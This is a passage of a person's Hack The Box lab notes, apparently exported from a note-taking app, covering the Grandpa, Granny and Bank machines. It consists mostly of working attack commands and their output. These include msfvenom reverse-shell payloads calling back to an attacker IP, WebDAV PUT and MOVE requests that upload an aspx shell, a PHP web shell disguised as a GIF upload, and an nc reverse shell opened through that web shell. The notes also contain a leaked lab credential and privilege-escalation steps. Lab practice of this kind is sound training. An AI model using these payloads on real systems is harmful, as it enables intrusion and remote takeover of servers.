LHOST=10.10.14.60 LPORT=3232 &gt; shellcode.txt &lt;&lt;&lt;non hex (not used)<br />msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp -e x86/alpha_mixed -f python LHOST=10.10.14.60 LPORT=3232&gt; shellcodehex.txt<br />vi shellcode.hex <br />:%s/buf += //g <br />:%s/&quot;//g<br />:%s/\n//g         &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;sweet deal to get rid of the begingof the lines<br />add shellcode to  /usr/share/exploitdb/exploits/windows/remote/41738.py (copied into Grandapa dir)<br /> <br /> nc -nlvp 3232   </div><div class='page'><h1 class='title level-4'>10.10.10.14 Grandpa 2</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>windows 2003 (iis <small>6.0</small>)<br /><br /><br /><br /><a href="https://medium.com/@nmappn/grandpa-w-o-metasploit-fa964cb260d4">https://medium.com/@nmappn/grandpa-w-o-metasploit-fa964cb260d4</a><br /><br /><br /><br /><br /><br /><br />./windows-exploit-suggester.py --database 2020-04-23-mssb.xls --systeminfo ../systeminfo.txt</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.14 &amp;&amp; nmap -sC -sV -Pn 10.10.10.14 &amp;&amp; nmap -p- -Pn 10.10.10.14<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 16:09 EDT<br />Nmap scan report for 10.10.10.14<br />Host is up (0.18s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 16:10 EDT<br />Nmap scan report for 10.10.10.14<br />Host is up (0.17s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   Server Date: Wed, 22 Apr 2020 20:10:17 GMT<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK<br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   WebDAV type: Unknown<br />|_  Server Type: Microsoft-IIS/6.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 26.22 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-22 16:10 EDT<br />Nmap scan report for 10.10.10.14<br />Host is up (0.16s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 274.81 seconds<br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 6.0<br />|_http-server-header: Microsoft-IIS/6.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host http://10.10.10.14:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.14<br />+ Target Hostname:    10.10.10.14<br />+ Target Port:        80<br />+ Start Time:         2020-04-22 16:14:05 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/6.0<br />+ Retrieved microsoftofficewebserver header: 5.0_Pub<br />+ Retrieved x-powered-by header: ASP.NET<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;microsoftofficewebserver&#39; found, with contents: 5.0_Pub<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-aspnet-version header: 1.1.4322<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Retrieved dasl header: &lt;DAV:sql&gt;<br />+ Retrieved dav header: 1, 2<br />+ Retrieved ms-author-via header: MS-FP/4.0,DAV<br />+ Uncommon header &#39;ms-author-via&#39; found, with contents: MS-FP/4.0,DAV<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Public&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Public&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Public&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ WebDAV enabled (PROPPATCH PROPFIND MKCOL UNLOCK COPY SEARCH LOCK listed as allowed)<br />+ OSVDB-13431: PROPFIND HTTP verb may show the server&#39;s internal IP address: http://10.10.10.14/<br />+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.<br />+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.<br />+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).<br />+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.<br />+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.<br />+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.<br />+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host<br />+ End Time:           2020-04-22 16:34:31 (GMT-4) (1226 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.15 Granny</h1><br/>root@kali:~/Desktop/Machines/HTB/Granny# nmap -sC -sV -oN Granny.txt 10.10.10.15<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-18 22:04 EDT<br />Nmap scan report for 10.10.10.15<br />Host is up (0.14s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   WebDAV type: Unkown<br />|   Server Type: Microsoft-IIS/6.0<br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Server Date: Fri, 19 Jul 2019 02:04:13 GMT<br />|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 22.09 seconds<br /><br />root@kali:~/Desktop/Machines/HTB/Granny# davtest -url <a href="http://10.10.10.15">http://10.10.10.15</a><br />********************************************************<br /> Testing DAV connection<br />OPEN		SUCCEED:		<a href="http://10.10.10.15">http://10.10.10.15</a><br />********************************************************<br />NOTE	Random string for this session: _wsI2nxsiK<br />********************************************************<br /> Creating directory<br />MKCOL		SUCCEED:		Created <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK">http://10.10.10.15/DavTestDir__wsI2nxsiK</a><br />********************************************************<br /> Sending test files<br />PUT	shtml	FAIL<br />PUT	pl	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl</a><br />PUT	cfm	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm</a><br />PUT	asp	FAIL<br />PUT	html	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />PUT	jsp	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp</a><br />PUT	php	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php</a><br />PUT	jhtml	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml</a><br />PUT	cgi	FAIL<br />PUT	txt	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br />PUT	aspx	FAIL<br />********************************************************<br /> Checking for test file execution<br />EXEC	pl	FAIL<br />EXEC	cfm	FAIL<br />EXEC	html	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />EXEC	jsp	FAIL<br />EXEC	php	FAIL<br />EXEC	jhtml	FAIL<br />EXEC	txt	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br /><br />********************************************************<br />/usr/bin/davtest Summary:<br />Created: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK">http://10.10.10.15/DavTestDir__wsI2nxsiK</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br />Executes: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a> &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />Executes: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a>    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />Rerun davtest, while being proxied through burp so I can steal the put method<br />root@kali:~/Desktop/Machines/HTB/Granny# davtest -url <a href="http://localhost">http://localhost</a><br />********************************************************<br /> Testing DAV connection<br />OPEN		SUCCEED:		<a href="http://localhost">http://localhost</a><br />********************************************************<br />NOTE	Random string for this session: 0Ol1n31HpPyg<br />********************************************************<br /> Creating directory<br />MKCOL		SUCCEED:		Created <a href="http://localhost/DavTestDir_0Ol1n31HpPyg">http://localhost/DavTestDir_0Ol1n31HpPyg</a><br />********************************************************<br /> Sending test files<br />PUT	aspx	FAIL<br />PUT	cfm	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm</a><br />PUT	txt	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />PUT	shtml	FAIL<br />PUT	jhtml	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml</a><br />PUT	html	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />PUT	cgi	FAIL<br />PUT	asp	FAIL<br />PUT	php	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php</a><br />PUT	pl	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl</a><br />PUT	jsp	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp</a><br />********************************************************<br /> Checking for test file execution<br />EXEC	cfm	FAIL<br />EXEC	txt	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />EXEC	jhtml	FAIL<br />EXEC	html	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />EXEC	php	FAIL<br />EXEC	pl	FAIL<br />EXEC	jsp	FAIL<br /><br />********************************************************<br />/usr/bin/davtest Summary:<br />Created: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg">http://localhost/DavTestDir_0Ol1n31HpPyg</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp</a><br />Executes: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />Executes: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br /><br /><br /><br />edited put request in burp...<br />    REQUEST<br />PUT /CoolHandSquid.html HTTP/1.1<br />TE: deflate,gzip;q=0.3<br />Connection: close<br />Host: localhost:80<br />User-Agent: DAV.pm/v0.49<br />Content-Length: 32<br />HTML put via coolhandsquid                                <br /><br />    RESPONCE<br />HTTP/1.1 201 Created<br />Connection: close<br />Date: Fri, 19 Jul 2019 02:31:55 GMT<br />Server: Microsoft-IIS/6.0<br />MicrosoftOfficeWebServer: 5.0_Pub<br />X-Powered-By: ASP.NET                                               &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;now we know .asp will be executed<br />Location: <a href="http://localhost/CoolHandSquid.html">http://localhost/CoolHandSquid.html</a><br />Content-Length: 0<br />Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK<br />                    <br />                    <br />                                                                     success, can browse to http://10.10.10.15:80/CoolHandSquid.html<br /><br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f aspx -o AspxShell.txt<br />copy shellcode into previous request and GO<br />when you navigate to the web page you will need to click “view page source”<br /><br />Now move Coolhandsquid.html to Coolhandsquid.aspx<br /><br />MOVE /Coolhandsquid.html HTTP/1.1<br />Destination: /Coolhandsquid.aspx<br />TE: deflate,gzip;q=0.3<br />Connection: close<br />Host: localhost:80<br />User-Agent: DAV.pm/v0.49<br />Content-Length: 2787<br /><br />run<br />start multi handler<br />navigate to website<br />enjoy network service shell<br /><br />use post/multi/recon/local_exploit_suggester<br />[*] 10.10.10.15 - Collecting local exploits for x86/windows...<br />[*] 10.10.10.15 - 29 exploit checks are being tried...<br />[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.<br />[*] Post module execution completed<br /><br /><br /><br />Enjoy your system shell<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>10.10.10.29 Bank</h1><br/>root@kali:~/Desktop/Machines/HTB/Bank# nmap -sC -sV -oN BankNmap.txt 10.10.10.29 <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-20 11:29 EDT<br />Nmap scan report for 10.10.10.29<br />Host is up (0.15s latency).<br />Not shown: 997 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)<br />|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)<br />|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)<br />|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)<br />53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)<br />| dns-nsid: <br />|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu<br />80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 17.90 seconds<br /><br />replacment for dirbuster\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://bank.htb">http://bank.htb</a> &gt;&gt; Bank.dirs<br />_|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-07-20_12-45-10.log<br /><br />Target: <a href="http://bank.htb">http://bank.htb</a><br /><br />[12:45:10] Starting: <br />[12:45:11] 403 -  279B  - /.php<br />[12:45:11] 302 -    7KB - /index.php  -&gt;  login.php<br />[12:45:12] 200 -    2KB - /login.php<br />[12:45:12] 302 -    3KB - /support.php  -&gt;  login.php<br />[12:45:13] 403 -  281B  - /icons/<br />[12:45:14] 403 -  283B  - /uploads/<br />[12:45:17] 200 -    2KB - /assets/<br />[12:45:31] 302 -    0B  - /logout.php  -&gt;  index.php<br />[12:45:46] 200 -    1KB - /inc/<br />[13:10:39] 403 -  289B  - /server-status/<br />[13:35:55] 200 -  248KB - /balance-transfer/<br /><br />Task Completed<br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><a href="http://bank.htb/balance-transfer/">http://bank.htb/balance-transfer/</a><br />looking for a small one that is not encrypted<br />wget <a href="http://bank.htb/balance-transfer/">http://bank.htb/balance-transfer/</a><br />cat index.html | grep -v &quot;&gt;5&quot;      to remove files that are size 5(00-99) <br />68576f20e9732f1b2edc4df5b8533230.acc is left (size 257)<br />--ERR ENCRYPT FAILED<br />+=================+<br />| HTB Bank Report |<br />+=================+<br /><br />===UserAccount===<br />Full Name: Christos Christopoulos<br />Email: chris@bank.htb<br />Password: !##HTBB4nkP4ssw0rd!##<br />CreditCards: 5<br />Transactions: 39<br />Balance: 8842803 .<br />===UserAccount===<br /><br />msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f raw -o PhpShell.php<br />can only upload image<br />cp PhpShell.php PhpShell.gif<br />WHEN UPLOADING FILE CAPTURE WITH BURP!!!!!!!<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />POST /support.php HTTP/1.1<br />Host: bank.htb<br />User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: <a href="http://bank.htb/support.php">http://bank.htb/support.php</a><br />Content-Type: multipart/form-data; boundary=---------------------------25819144810188292491428089033<br />Content-Length: 631<br />Cookie: HTBBankAuth=dbo8uvvaj95qmg0ebsgujbrmm2<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br /><br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;title&quot;<br /><br />yeet<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;message&quot;<br /><br />cannon<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;PhpShell.gif.htb&quot;                                This line is also important<br />Content-Type: image/gif<br /><br />GIF89a/ &lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                                                                    THIS IS THE IMPORTANT LINE<br />-----------------------------25819144810188292491428089033<br />Content-Disposition: form-data; name=&quot;submitadd&quot;<br /><br /><br />-----------------------------25819144810188292491428089033--<br />\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/<br />needed to change the magic bytes to GIF89a/ so it would be read as a gif<br />replace shell code with generic php call back<br />changed name to PhpShell.gif.htb becasue there is a comment in the responce saying that .htb files will run as .php<br />navigate to /support/ page and hover over most recent upload to see its location (bank.htb/uploads/PhpShell.gif.htb)<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=whoami</a><br />wwwroot<br />in termial nc -nlvp 3232<br /><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc">http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc</a><a href="http://bank.htb/uploads/PhpShell.gif.htb?coolhand=nc%2010.10.14.60%203232%20-c%20/bin/bash"> 10.10.14.60 3232 -c /bin/bash</a><br />enjoy your shell!!!!!<br /><br />SHELL FIX<br />python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br />control z<br />stty raw -echo<br />fg          you will be blind<br />now you can tab complete<br />export TERM=screen<br />now you can clear screen<br /><br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><a href="Protocols--smtp.html">LinEnum</a> show us we can write to passwd file<br />openssl passwd -1 coolhand<br 